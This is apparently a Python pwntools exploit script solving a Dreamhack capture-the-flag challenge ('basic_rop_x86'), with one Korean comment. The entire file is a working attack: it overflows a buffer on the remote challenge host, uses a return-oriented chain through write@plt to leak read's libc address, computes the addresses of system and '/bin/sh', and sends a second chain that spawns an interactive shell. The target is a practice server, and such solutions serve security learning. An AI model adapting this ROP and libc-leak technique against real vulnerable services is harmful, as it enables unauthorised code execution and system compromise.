from pwn import *

# ret2main

context.arch = "i386"
p = remote('host3.dreamhack.games', 9647)

e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']

binsh = list(libc.search(b'/bin/sh'))[0]
read_system_offset = libc.symbols['read'] - libc.symbols['system']
read_binsh_offset = libc.symbols['read'] - binsh

pop = r.find_gadget(['pop ebx', 'ret'])[0]
pop2 = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3 = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
ret = r.find_gadget(['ret'])[0]

# pop = 0x080483d9
# pop3 = 0x08048689
# ret = 0x080483c2
# pop2 = 0x0804868a

payload = b'a'*0x40 + b'a'*0x8
payload += p32(ret)
payload += p32(write_plt) + p32(pop3) + p32(0x1) + p32(read_got) + p32(0x4) + p32(main)

# payload += p32(write_plt) + p32(pop2) + p32(1) + p32(read_got) + p32(pop) + p32(0x4) + p32(main)    
# 이렇게하면 pop앞에 ret이 존재하기 때문에 안됨
    
# first main

p.send(payload)

p.recvuntil(b'a'*0x40)
read = u32(p.recv(4))

system = read - read_system_offset
binsh = read - read_binsh_offset

# second main

payload = b'a'*0x40 + b'a'*0x8
payload += p32(system) + p32(pop) + p32(binsh)

p.send(payload)
p.interactive()
